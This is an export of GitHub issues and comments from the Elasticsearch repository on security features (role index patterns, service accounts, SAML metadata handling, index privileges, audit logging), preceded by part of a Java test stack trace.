      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475)
      at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
      at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
      at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
      at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
      at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
      at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
      at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
      at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
      at java.lang.Thread.run(Thread.java:833)

```",,no,">test-failure,:Security/Authentication,"
elastic/elasticsearch,317449280,"Change index pattern definition in roles to use grant/deny","*Original comment by @jaymode:*

Now that we support the ability to grant and deny fields in roles, we should consider using the same syntax for names of indices in roles. While negations are currently supported in a role, the user must use the lucene regex format, which isn't very user friendly.

The current role format looks like this:

``` json
{
    ""indices"" : [
    {
      ""names"" : [ ""*"" ],
      ""privileges"" : [ ""read"" ]
    }
  ]
}
```

An idea for the new format would be:

``` json
{
    ""indices"" : [
    {
      ""index_names"": {
         ""grant"": [ ""*"" ],
         ""deny"": [ "".security*"", ""foo"" ]
       },
      ""privileges"" : [ ""read"" ]
    }
  ]
}
```

The naming can be improved but this should suffice for the general idea of this change.


","*Original comment by @uboness:*

I assume it's about making it easy to negate indices and not about really changing the granting model that we have... if the later is true, then that's quite a task... good luck, anything below this text doesn't apply then. Otherwise:

""grant"" & ""deny"" are confusing terms... you're not really granting & denying here... you're simply ""including"" and ""excluding"" indices for the granted privileges (""read"" in your example). It may sound like there's not difference between the two, but there is.... when you deny read on an index, you really ""deny"" it... the following example show how this breaks:

``` json
{
    ""indices"" : [
    {
      ""index_names"": {
         ""deny"": [ "".security*"", ""foo"" ]
       },
      ""privileges"" : [ ""read"" ]
    },
    {
      ""index_names"" : {
        ""grant"" : [ ""*"" ]
      },
      ""privileges"" : [ ""read"" ]
    }
  ]
}
```

Again... if the intention here is just to help the user pick & choose the indices... I'd simply change the terminology to ""include"" & ""exclude""
*Original comment by @skearns64:*

We had this arm-wrestle for FLS, I believe, which may have concluded after Jay filed this issue.

The language that we went with for FLS was `grant` and `except`:

```
{
  ""indices"" : [
    {
      ""names"" : [ ""*"" ],
      ""privileges"" : [ ""read"" ],
      ""field_security"" : {
        ""grant"" : [ ""*""],
        ""except"": [ ""customer.handle"" ]
      }
    }
  ]
}
```

Adapting @jaymode 's first example to this terminology would look like this:

```
{
    ""indices"" : [
    {
      ""index_names"": {
         ""grant"": [ ""*"" ],
         ""except"": [ "".security*"", ""foo"" ]
       },
      ""privileges"" : [ ""read"" ]
    }
  ]
}
```
Is there any update on this? This functionality would be very useful to me.Any update on this ? Or will the solution described here: https://discuss.elastic.co/t/exclude-indices-from-elastic-search-role/244159/3 be a supporter solution ?",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1196074042,"[Fleet] Create new service account `elastic/fleet-server-remote` for remote agent connections","### Description

**Background**
As part of https://github.com/elastic/kibana/issues/104986 we will be adding the ability for Elastic Agents to send agent monitoring data to a remote Elasticsearch cluster. In order to achieve this, we will need a service token for the remote cluster which fleet server will use. 

This service account will need less permissions than the `elastic/fleet-server` as integration data will not be sent to remote clusters yet.

**Service Account Details**

Name: `elastic/fleet-server-remote`

Permissions:
-  for indices `logs-*`, `metrics-*` privileges ""write"", ""create_index"", ""auto_configure""
","Pinging @elastic/es-security (Team:Security)Hi, a couple of questions: 

> the ability for Elastic Agents to send agent monitoring data to a remote Elasticsearch cluster

Is the Agent sending data, or the Fleet Server? Is there any compatibility constraint?

> This service account will need less permissions than the elastic/fleet-server as integration data will not be sent to remote clusters yet.

Does it mean that it will do in the future?

Hi thanks for the quick reply!

> Is the Agent sending data, or the Fleet Server? Is there any compatibility constraint?

Both, the fleet server is just an agent with the fleet server integration installed. When you say compatibility constraint do you mean between elastic agent versions and elasticsearch version? Not that I am aware of. (CC @ph )

> Does it mean that it will do in the future?

I think that is the intention one day but I don't know the timeframe. Is it possible to expand the permissions of a service account in a future release? > When you say compatibility constraint do you mean between elastic agent versions and elasticsearch version?

Yes, since they ""belong"" to different deployments. Let's assume that Fleet is a newer version, sending data to an older Elasticsearch cluster: could this cause any problem, for example if the permission set or schema changed between the two?

> I think that is the intention one day but I don't know the timeframe. Is it possible to expand the permissions of a service account in a future release?

Yes it is, permissions can be redefined in newer versions.
I was wondering because, if we already know that we'll need this service account to be exactly the same as the `fleet-server` one in a reasonable timeframe, I would discuss if we really need to create a new one to limit permissions only in a few versions. I love the least privilege principle, but I also really love having the minimum number of service accounts 🙂 

So the question is: which is the right tradeoff between security and simplicity? Do we really need a new service account?Thanks for this input, it's really useful. My answer to both questions is: let me talk to some people and get back to you on that :) > Yes it is, permissions can be redefined in newer versions. I was wondering because, if we already know that we'll need this service account to be exactly the same as the `fleet-server` one in a reasonable timeframe, I would discuss if we really need to create a new one to limit permissions only in a few versions. I love the least privilege principle, but I also really love having the minimum number of service accounts 🙂
> 
> So the question is: which is the right tradeoff between security and simplicity? Do we really need a new service account?

I don't think we'll ever want `elastic/fleet-server-remote` to have the same permissions, specifically, we'd never need any access to any of the `.fleet*` system indices from the remote cluster.

A user who has `manage_service_accounts` can create service account tokens for either account, so presumably they have access to the `.fleet*` system indices anyways. The main issue that this would help us protect against is a vulnerability in Kibana or Fleet Server that exposes the service account token for the remote cluster that we'll storing in the `.kibana` (encrypted) or `.fleet-policies` (not currently encrypted) indices for the remote cluster.

In today's architecture, an RCE in Kibana would enable an attacker to read this token and use it to gain control of Agents being managed by the remote cluster. If we used a less privileged token, a vulnerability would only allow an attacker to ingest data into the integration data streams, but not the Fleet system indices.

In the future, we intend for Kibana to not have any read access to Fleet-managed secrets, only write access. This would eliminate the potential for an RCE in Kibana to expose this token at all. A Fleet Server vulnerability could still expose it, however Fleet Server does have a **much** smaller API surface to defend.

In general though, I think avoiding situations where this sensitive token could be used to gain access to control Agents on any cluster is valuable. Agents on the remote monitoring cluster are likely to be running on the same hosts as Elasticsearch of the main cluster which could be leveraged to further escalate privilege (say, by finding a way to reset the `elastic` password).Thanks for the input Josh. Also regarding @bytebilly's point here:

> Let's assume that Fleet is a newer version, sending data to an older Elasticsearch cluster: could this cause any problem, for example if the permission set or schema changed between the two?

Discussed this with @joshdover. If we were to introduce integration data in the future, we would stipulate that the remote cluster must have a minimum version for this to work, so we would be happy to proceed with a minimum set of privileges required for agent data for now. fyi @blakerouse 

I believe the original intent was to limit the permissions to the new remote cluster. @hop-dev 

> > Is the Agent sending data, or the Fleet Server? Is there any compatibility constraint?
> 
> Both, the fleet server is just an agent with the fleet server integration installed.

Does that mean an agent (without fleet server integration) installed on an end-user's environment can also send data directly to Elasticsearch using the service token as the credential? Service accounts were designed to be used by services that can have ""a few"" instances. It was not intended to be used by a large number of agents (at least that's my understanding) for which API keys are more suitable. Could you please clarify the intended usage of this new service account on this aspect?@ywangd The `elastic/fleet-server-remote` service token would still only be used by Fleet Servers it would not be handed down to each Elastic Agent. The `elastic/fleet-server-remote` token would be used by Fleet Server to create API keys for that cluster to send those down to each Elastic Agent.

The idea of the `elastic/fleet-server-remote` service token was that we can remove access to the `.fleet-*` system indexes because the Fleet Server does not need to use those in the remote elasticsearch case, as the Fleet Server is using its main elasticsearch for that.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,503170123,"Usage stats for Token service and API key service","Similar to the usage stats that are reported for authentication realms, we should think of adding the support for reporting usage stats for the Token service and API key service.


","Pinging @elastic/es-security (:Security/Authentication)We discussed in the team meeting, and even if this is a good point, we don't see high priority in adding this usage stat at the moment.

If we do that in the future, we will likely report counters rather than if services are enabled or not, as they will be on by default with TLS on the HTTP layer. The number of API keys configured in the system would bring some additional value.
",no,":Security/Authentication,Team:Security,"
elastic/elasticsearch,317454191,"Create APIs for modifying the full name/email of the current user","*Original comment by @lukasolson:*

There's currently an API to change the password of the current user, but it'd be nice if there were also APIs to modify the full name and email of the current user as well.


","*Original comment by @albertzaharovits:*

[User API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-users.html#_request_body_29) can definitely do that.*Original comment by @lukasolson:*

@albertzaharovits I think the request here was to be able to do that for the current user, meaning without the `manage_security` privilege, similar to how change password works. Can you do that now?*Original comment by @jaymode:*

No you cannot do that currently.",no,">feature,:Security/Authentication,Team:Security,"
elastic/elasticsearch,400723727,"Be more lenient when remotely hosted SAML IdP metadata is unavailable","Currently, if Elasticsearch is configured for SAML but can't fetch the metadata, it bails because it can't authenticate users. However, it might still be possible to authenticate users via another realm (native, LDAP, etc).

Would it be possible to be more lenient or resilient here? Perhaps disable the realm and poll for metadata in the background?
","Pinging @elastic/es-securityThis isn't really something that Elasticsearch can do anything about.
If Kibana is specifically requesting a SAML login, then that's what ES does - it doesn't have a username or password to authenticate with, it just has a request from Kibana to initiate SAML authentication.

I think this needs to be driven as a Kibana issue to provide a choice of login methods (either always, or if SAML is unavailable).
If Kibana needs additional features/APIs from ES to support that then we can build them, but this issue is not solvable by ES.Ah, I see this is specifically about starting the node if the URL is unavailable.
I'm hesitant to do that - it means we will (fairly quietly) accept an incorrect configuration and leave the admin to work out why things are broken.

I understand that is makes node start up fragile, but it's impossible for us to reliably know whether the URL is _wrong_ or just not currently available.  This is why the ES docs encourage local metadata files rather than fetching from a URL - it is a much more reliable option.I think we should do this. The `HttpMetadataResolver` can keep on attempting to get metadata every `refresh` interval, until the URL (and thus the SAML realm in Elasticsearch) is available 

> it means we will (fairly quietly) accept an incorrect configuration 

It's true, but isn't this the case also for LDAP, AD realms? We validate neither that we can reach the ldap URL, nor that the bind credentials are correct when provided. We just fail authentication attempts against this realm until the configuration is fixed. 

> and leave the admin to work out why things are broken.

we should of course print a  `WARN` on startup and an appropriate error message on authentication failure

>  This is why the ES docs encourage local metadata files rather than fetching from a URL - it is a much more reliable option.

No matter what we decide, that is a valid point - I brought it up with @pugnascotia also when we first discussed the issue. > It's true, but isn't this the case also for LDAP, AD realms? We validate neither that we can reach the ldap URL, nor that the bind credentials are correct when provided

True, although I think this case might be more likely.

I'm happy to go ahead with this. I do think it will bite some users, but it will also benefit other users. Realistically, anyone who _can_ should use a local file for the metadata and sync it from the remote source as needed.
That's harder to do well in a container/immutable environment, so I'm happy to change this behaviour to target the needs of those users. I also hit this and think that it should nicely fail instead of majestically error out.
In my case, the saml configuration is valid, worked and was not changed. It's the dns resolution that failed :expressionless: 
I know we should not be dependent on network but still this should nicely fail and not bring the whole cluster down.
I will try the workaround by saving the metadata to a local file. The issue is that my docker engine had some dns issues and was unable to resolve so I was hoping to use local user Auth as fallback.
I had dns issues before, like for detection rule updates and that did not had such an hard impact.
Also, I've got a second realm local auth as fallback for admins which is impacted and it should not be since it has nothing to do with the SAML realmWhat I am saying is that things in general break or are taken offline for updates(dns resolutions, networks, etc.) and we should not depend on them exclusively. The ES cluster should still stand during such an event and allow admins or locally define users to authenticate.
I see this as a bug, Can we please tag it accordingly?> I see this as a bug, Can we please tag it accordingly?

Tagging this as a bug won't change the priority - we're not consciously refusing to make this change, it's simply more complex than it sounds, and it hasn't been a high enough priority relative to other work.

I don't agree that it's a bug. It a conscious design choice that doesn't suit everyone's needs, but arguing about that classification won't increase (or decrease) the likelihood of it being changed.

If someone submits a PR that resolves the problem in an acceptable way, then we would merge it. Otherwise it's subject to priorities, like every other change is.I see.
But you agree that the local user auth realm should work regardless of the of the saml/oidc/ldap etc. server reach?https://www.elastic.co/guide/en/elasticsearch/reference/current/file-realm.html
""
The file realm is very useful as a fallback or recovery realm. For example in cases where the cluster is unresponsive or the security index is unavailable, or when you forget the password for your administrative users. In this type of scenario, the file realm is a convenient way out - you can define a new admin user in the file realm and use it to log in and reset the credentials of all other users.
""
Otherwise why do we call this fallback?I'm not sure what outcome you're looking for here.

We agree that the behaviour should change. We're happy for someone to pick up that work, but based on our estimate of the work involved vs the available engineering time we have, we don't expect to have the capacity to change ourselves in the near future.

Local user authentication _does_ work when a SAML realm cannot load its metadata, the issue that is described here is that you cannot start a node when a SAML realm has configuration that cannot be resolved.  
That was intentional so that nodes would not start if they had configuration errors, and the setting for the metadata was intentionally named `idp.metadata.path` rather than `.url` to reflect the fact that we intend and recommend that the metadata be loaded from a file not a https resource.
On reflection, we believe that a different set of tradeoffs are justified.
I see.
But would you still agree that the local or native users should still work?

https://www.elastic.co/guide/en/elasticsearch/reference/current/file-realm.html
""
The file realm is very useful as a fallback or recovery realm. For example in cases where the cluster is unresponsive or the security index is unavailable, or when you forget the password for your administrative users. In this type of scenario, the file realm is a convenient way out - you can define a new admin user in the file realm and use it to log in and reset the credentials of all other users.
""
Otherwise why do we call this fallback?

That way I learned AAA and perhaps I can find some RFCs in this regard, if one failing auth method was down it was never affecting the second or third auth mechanism.

Imagine that some big SAML IDP provider is taken down for some reason(maintenance, attack,etc.). All ES clusters using that will be take also offline. DDoS like.
Perhaps we need the insights of a CISO on this...
> Imagine that some big SAML IDP provider is taken down for some reason(maintenance, attack,etc.). All ES clusters using that will be take also offline. DDoS like.

That's not accurate.
What is accurate is that _if_ you configure a SAML realm to load its metadata directly from the IdP, rather than following the recommendation to load the metadata from a file _and_ you shut down a node,  _then_ you will not be able to restart that node while the metadata is unavailable.

An IdP going offline does not cause running ES clusters to stop.  
And if node restart is an issue for you, then there is the simple option to load metadata from a file.
Correct. I have actually tested this.I'll try to get this done this week.@tvernum @albertzaharovits @jakelandis is there any way that we can get this issue bumped up in priority? Being unable to start an instance due to an unavailable network resource is problematic for ESS and our customers.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,501991815,"Analyze and get templates index action privileges","The `indices:admin/analyze` and `indices:admin/template/get` actions currently require the `manage` index privilege. `manage` is too broad and it would be more desirable that callers of these actions require a much more restricted privilege. Given the current structure, I suggest we move them under `view_index_metadata`.

For reference here are all the actions of an indices admin client:
```
# monitor
indices:monitor/stats
indices:monitor/recovery
indices:monitor/segments
indices:monitor/shard_stores
indices:monitor/upgrade

# view_index_metadata
indices:monitor/settings/get
indices:admin/aliases/get
indices:admin/get
indices:admin/mapping/get
indices:admin/mappings/fields/get
indices:admin/validate/query
indices:admin/ilm/explain (not an indices admin client operation, yet?)

# manage
indices:admin/create
indices:admin/delete
indices:admin/close
indices:admin/open
indices:admin/aliases
indices:admin/upgrade
indices:admin/template/put
indices:admin/resize
indices:admin/settings/update
indices:admin/mapping/put
indices:admin/template/delete
indices:admin/rollover
indices:admin/cache/clear

indices:admin/refresh
indices:admin/flush
indices:admin/synced_flush
indices:admin/forcemerge

indices:admin/analyze
indices:admin/template/get
```

Related https://github.com/elastic/elasticsearch/issues/29998","Pinging @elastic/es-security (:Security/Authorization)Possibly also related: https://github.com/elastic/elasticsearch/issues/53110any updates here? @kunisen No. If the issue is unassigned and has no recent comment or a link to a PR, then it is generally safe to assume that nothing has changed. :+1:

Also relates to https://github.com/elastic/kibana/issues/36635 - it's hard to make a read-only Kibana user where autocomplete works properly in Kibana Dev Tools. The Kibana POST to `/api/console/proxy?path=_template&method=GET' results in a security exception and all autocomplete fails to operate:

```
{
  ""error"" : {
    ""root_cause"" : [
      {
        ""type"" : ""security_exception"",
        ""reason"" : ""action [indices:admin/template/get] is unauthorized for user [...]""
      }
    ],
    ""type"" : ""security_exception"",
    ""reason"" : ""action [indices:admin/template/get] is unauthorized for user [...]""
  },
  ""status"" : 403
}
```",no,">enhancement,:Security/Authorization,team-discuss,Team:Security,"
elastic/elasticsearch,317449270,"Fine grained ability to control authorization grants","*Original comment by @jaymode:*

Currently, any user with the ability to edit another user can assign the user to roles and any user can create a role with any privilege if they have are authorized to create a role. In some situations it is desirable to give a user the ability to assign/remove certain roles and the ability to create/edit roles but only with a limited subset of permissions.

This feature could be used in a multi-tenant environment where there are global admin users who can create tenant level admin users. This breaks down with cluster level permissions but should be ok for index level actions.",,no,">feature,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317454147,"x-pack endpoint lists confusing license information when disabling a feature","*Original comment by @spinscale:*

When a user disables a feature like `xpack.security.enabled: false`, then the `_xpack` output sets `available` and `enabled` to false, like this

``` json
GET /_xpack
{
  ""build"" : {
    ""hash"" : ""${buildNumber}"",
    ""timestamp"" : ""NA""
  },
  ""license"" : {
    ""uid"" : ""81fc2204-dd1a-44a1-a662-e4d5e690413b"",
    ""type"" : ""trial"",
    ""mode"" : ""trial"",
    ""status"" : ""active"",
    ""expiry_date_in_millis"" : 1464274477370
  },
  ""features"" : {
    ""graph"" : {
      ""description"" : ""Graph Data Exploration for the Elastic Stack"",
      ""available"" : true,
      ""enabled"" : true
    },
    ""monitoring"" : {
      ""description"" : ""Monitoring for the Elastic Stack"",
      ""available"" : false,
      ""enabled"" : false
    },
    ""security"" : {
      ""description"" : ""Security for the Elastic Stack"",
      ""available"" : false,
      ""enabled"" : false
    },
    ""watcher"" : {
      ""description"" : ""Alerting, Notification and Automation for the Elastic Stack"",
      ""available"" : true,
      ""enabled"" : true
    }
  },
  ""tagline"" : ""You know, for X""
}
```

I would expect available to be true and enabled to be false.


","*Original comment by @spinscale:*

the reason here, is that we try to be smart on initialization... For example in `Security.nodeModules()` we only initialize `securityLicenseState` when security has been enabled, otherwise this is null and we never know if the license is valid or not when the above response is created.

Same in `GraphModule.configure()`, in `MonitoringModule.configure()` and `WatcherModule.configure`.

Either we remove the available flag or we fix this by always instantiating licensees and use those
*Original comment by @jaymode:*

I am a fan of available in the output. I also think we should always return all of the license acknowledgement messages, not just when a feature is enabled.  It is all the same plugin, which implies initializing the licensees all the time or combining to a single licensee.
*Original comment by @skearns64:*

What would we use `available` for? For Security, we might report `available`, but with a Gold license, FLS/DLS and custom realms would be unavailable, so the feature is really only partially available. For Monitoring with a Basic license, we report `available`, but multi-cluster, and configurable retention periods are not supported. 

If we're just looking for a way to represent ""at least some part of this feature is available,"" it seems like we might be able to represent that with just `enabled`?  
*Original comment by @spinscale:*

agreeing with steve here... as long as our feature set is only per module (security, monitoring, watcher, graph) instead of per feature (DLS, FLS, watcher-actions-only-between-8am-and-10am), `available` does not seem to make much sense to me? Well, even the definition of a feature set here is tricky...
*Original comment by @jaymode:*

How I see it:

`enabled`: the feature is actively in use (well working/running)
`available`: the feature can be used based on your license

Yes at this level it is not the most useful because we do not know what sub feature sets are available or enabled. But @uboness plans to move this down to that level and it will become even more important.

I still think it has value at the current level. Why do I think this is useful? There have been numerous times where a user has installed shield and has said security doesn't work, I don't need credentials to use it. It turns out they were using a basic license. With `enabled` you don't get the detail that this module is not available to the user.
*Original comment by @skearns64:*

>  There have been numerous times where a user has installed shield and has said security doesn't work, I don't need credentials to use it. It turns out they were using a basic license. With enabled you don't get the detail that this module is not available to the user.

Wouldn't `enabled` be false if they had a Basic license? 
*Original comment by @jaymode:*

> Wouldn't enabled be false if they had a Basic license?

No it would not be false. Enabled is based on settings, not on the license state
",no,">bug,:Security/License,Team:Security,"
elastic/elasticsearch,1004679658,"Fix GET user "","" returning all users (fixes #72286)","Because ```,``` is a legal username, users can fetch this username from the ```GET /_security/user/{username}``` endpoint. This endpoint splits the username into a list if it contains commas, so username ```,``` would resolve to an empty list, meaning all users would be returned.

This PR fixes this by returning the username parameter if it only contains commas.","Pinging @elastic/es-security (Team:Security)",yes,":Security/Authentication,Team:Security,external-contributor,v8.6.0,"
elastic/elasticsearch,317447711,"Auditing should log the user as an attribute in a PutUserRequest/DeleteUserRequest event","*Original comment by @n0othing:*

Tested in 5.2.2:

The REST calls:

```
POST /_xpack/security/user/jacknich
{
  ""password"": EMAIL REDACTED
  ""roles"": [
    ""admin"",
    ""other_role1""
  ],
  ""full_name"": ""Jack Nicholson"",
  ""email"": EMAIL REDACTED
  ""metadata"": {
    ""intelligence"": 7
  }
}

DELETE _xpack/security/user/jacknich
```

The Audit Events:

```
[2017-03-10T18:06:23,473] [rest] [authentication_success]    principal=[elastic], realm=[reserved], uri=[/_xpack/security/user/jacknich], params=[{username=jacknich}]
[2017-03-10T18:06:23,552] [transport] [access_granted]    origin_type=[rest], origin_address=[127.0.0.1], principal=[elastic], action=[cluster:admin/xpack/security/user/put], request=[PutUserRequest]
[2017-03-10T18:06:25,349] [rest] [authentication_success]    principal=[elastic], realm=[reserved], uri=[/_xpack/security/user/jacknich], params=[{username=jacknich}]
[2017-03-10T18:06:25,351] [transport] [access_granted]    origin_type=[rest], origin_address=[127.0.0.1], principal=[elastic], action=[cluster:admin/xpack/security/user/delete], request=[DeleteUserRequest]
```

By including `authentication_success` and `access_granted` events in your audit, you can infer that `jacknich` was created and deleted. But it'd be much cleaner to log  this info in the `access_granted` event (rough example):

```
[2017-03-10T18:06:23,552] [transport] [access_granted]    origin_type=[rest], origin_address=[127.0.0.1], principal=[elastic], action=[cluster:admin/xpack/security/user/put], request=[PutUserRequest], request_principal=[jacknich]
[2017-03-10T18:06:25,351] [transport] [access_granted]    origin_type=[rest], origin_address=[127.0.0.1], principal=[elastic], action=[cluster:admin/xpack/security/user/delete], request=[DeleteUserRequest], request_principal=[jacknich]
```
 ",,no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,363424229,"Maintain a cache of role mappings","We don't currently cache role mappings because that would require cache management APIs etc, (which is a high burden to carry) and the realms should already cache the _result_ of role mapping.

But sometimes the user caches aren't enough.

A low cost way to cache role mappings would be by `(id, version)`.
That would mean we would still need to query the index each time, but we could avoid parsing the JSON and building the expression objects if the mapping hadn't changed.
","Pinging @elastic/es-security",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317454532,"Handle LDAP password controls","*Original comment by @jaymode:*

Some LDAP implementations such as 389DS will return password controls even when they have not been requested. These controls can contain information that makes a confusing situation clearer. For example, an LDAP user's LINK REDACTED due to ""grace logins"" and this could be unexpected. I am proposing that we add logging when a known password control is returned and if a control indicates that a user must reset their password, we need to fail authentication.","*Original comment by @jaymode:*

We discussed this yesterday in the security team meeting. We were not aware that an LDAP server would do this and Josh mentioned that 389DS has years of legacy code behind it so it might be unique to this LDAP server.

Our ldap library does provide support for these controls:
LINK REDACTED
LINK REDACTED

Given the support in the LDAP library, I think it is beneficial to add some logging for the information in these controls.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317447568,"Do not allow setting xpack.security.user when running as a node","*Original comment by @jaymode:*

I think we've thought about this but never did anything about it because we used shield.user in the test framework. In master we no longer use shield.user for node clients and we should probably fail on startup if someone sets shield.user and isn't running as a transport client.


","*Original comment by @jaymode:*

This is a great candidate for a BootstrapCheck.*Original comment by @jasontedor:*

Is that necessary? What is the last major version to support `shield.user`?*Original comment by @tvernum:*

I assume @jaymode intended this to apply to `xpack.security.user` instead.

That's relevant on [transport client](https://www.elastic.co/guide/en/x-pack/6.2/java-clients.html), but not server. However, I'm not aware of this actually coming up as an issue very often.
*Original comment by @jaymode:*

Yes sorry the setting is now xpack.security.user but the other option is to just not register the setting when running as a node and rely on that to prevent use",no,">enhancement,help wanted,:Security/Security,Team:Security,"
elastic/elasticsearch,500593377,"Deprecate and replace old Index privileges related to indexing documents","Existing Index privilege names fail to convey the meaning properly and a few like `create` have their own unexpected semantics (it allows indexing document only via Index API). Since we are adding a new `create_doc` privilege, we want to take this opportunity to clean up the existing privileges and either provide replica privilege if the semantics are correct or provide an alternative that is semantically correct. Also, the naming can be explicit about the operation that is performed.

Following are the existing Index privileges related to documents indexing lifecycle:
`create`: The privilege allows for indexing documents but only via Index/Bulk API but no update via Update API. It also allows update mapping actions. This one does not prevent document updates when using Index APIs.
`index`: The privilege allows indexing documents via Index/Bulk API, also allows for update action and mapping actions.
`delete`: The privilege allows deletion of documents
`write`: This privilege allows all write operations (index, deletes, updates) along with update mapping actions.
`read`: Read-only access to actions like count, explain, get, mget, get indexed scripts, etc.

**Following are the proposed new Index privileges:**
- [X] `create_doc`: This one is with changed semantics, allowing only indexing new documents but no updates. Plus this one removes the unexpected semantics of restricting this operation via Index API only. This will allow indexing new documents via Index/Bulk API and allows update mapping action. https://github.com/elastic/elasticsearch/pull/45806
- [ ] `index_doc`: This will be similar to `index` privilege.
- [ ] `delete_doc`: This will be similar to `delete` privilege.
- [ ] `write_doc`: This will be similar to `write` privilege.
- [ ] `read_doc`: This will be similar to `read` privilege.

| Privilege &#9660; Actions &#9658;  | Index new document | Update document | Delete document | Update mapping | Read actions (search, count etc.)
|---------------------------------------------|----------------------------|---------------------------------------------------------|--------------------------------------------------|--------------------------------------------------|--------------------------------------------------|
| `create_doc` | Allow | Deny | Deny | Allow | Deny |
| `index_doc` | Allow | Allow | Deny| Allow | Deny |
| `delete_doc` | Deny | Deny| Allow| Deny | Deny |
| `write_doc` | Allow | Allow | Allow | Allow | Deny |
| `read_doc` | Deny | Deny | Deny | Deny | Allow |

**Additional considerations:**
- During the discussion of naming of `create_doc` we had a proposal to split the `index` privilege into:
   `index_doc`: Privilege to index documents. It also includes `create_doc` privilege.
     I think this would be a breaking change but adding it to discuss this.
     `update_doc`: Privilege to update documents. Not sure how this would work, for example, an upsert case allows update of an existing document or index new document if it does not exist.
     If we want to support this splitting of `index` privilege into two with above semantics then it would be a breaking change and might not be possible other than to modify the index engine to handle it.

 - `read_doc` privilege: We could consider some more granular approach. I see an enhancement request: https://github.com/elastic/enhancements/issues/5470 which talks about providing a way to restrict users to certain search types?

**Proposed path forward:**
- When do we introduce these new Index privilege changes and deprecate old?
   Introduce these new index privileges in v8.0.0 and start logging deprecated warnings.
- When do we remove the usage of old Index privileges? v9.0.0
- Can we provide some migration tool/upgrade assistance?
   We have an issue opened to discuss this possibility to enhance the deprecation info API https://github.com/elastic/elasticsearch/issues/47714
   We could consider providing a tool for migration but it might not be possible to migrate all the role descriptors using the deprecated privilege names. 
The problem exists for the privilege which does not have the exact alternative or would change the behavior if we use the alternative, eg. `create` with possible alternative `create_doc`.
  - There are different places where the index privilege is used during role definition:
    - file (`roles.yml`).(If an alternative exists for the privilege we can update the role definitions in the file. This option is less likely as we would want to avoid file mutations)
    - built-in roles (If an alternative exists for the privilege we can update the role definitions)
    - role definitions indexed in security index via API (If an alternative exists for the privilege we can update the role definitions)
    - dynamic role definitions - custom roles provider extension (This is a custom security extension and will require users to update the extension).
- Do we want to consider the additional changes like splitting the `index` privilege or more granular privileges for `read`?

This issue exists to gather feedback on the path forward and comments around introducing/removing/updating index privileges in relation to indexing documents.","Pinging @elastic/es-securityPinging @elastic/es-distributedPinging @elastic/es-core-featuresHi @ywelsch I have added your suggestions to split the `index` into `index_doc` and `update_doc` privilege but wanted to confirm if it is what you were proposing. I feel that it would be breaking change and do you think strongly about it? Thanks for your inputs.UI currently uses `GET _security/privilege/_builtin` to list the built-in privileges. We could enhance the response to include the deprecated index privilege names and alternatives/suggestions as:
```
{
  ""cluster"": [
    ""...""
  ],
  ""index"": [
    ""all"",
    ""create"",
    ""create_doc""
    ""..."",
    ""write""
  ],
  ""deprecations"": {
    ""cluster"": [],
    ""index"": [
      {
        ""name"": ""create"",
        ""alternative/suggestion"": ""create_doc"",
        ""is_exact_replacement"": false
      },
      {
        ""name"": ""index"",
        ""alternative/suggestion"": ""index_doc"",
        ""is_exact_replacement"": true
      }
    ]
  }
}
```@bizybot The whole point of creating new names is so that we can make breaking changes. We explicily don't want the new names to be exact replicas of the old names.

- `index_doc` should not allow the `_update` API. It should behave like the old `create` privilege. The `_update` API is not a standard indexing API and has different security implications. It should not be part of the standard ""indexing"" privilege.

- `update_doc` should allow the use of the `_update` API (which is also op_type=UPDATE). I don't think it should allow any other sort of indexing, mostly because the name implies update-only and the principle of least surprise implies that it should therefore be update-only. If admins want index+update (but not delete) then they can grant two privileges.
@tvernum Thank you for your comment.

> @bizybot The whole point of creating new names is so that we can make breaking changes. We explicily don't want the new names to be exact replicas of the old names.
> 

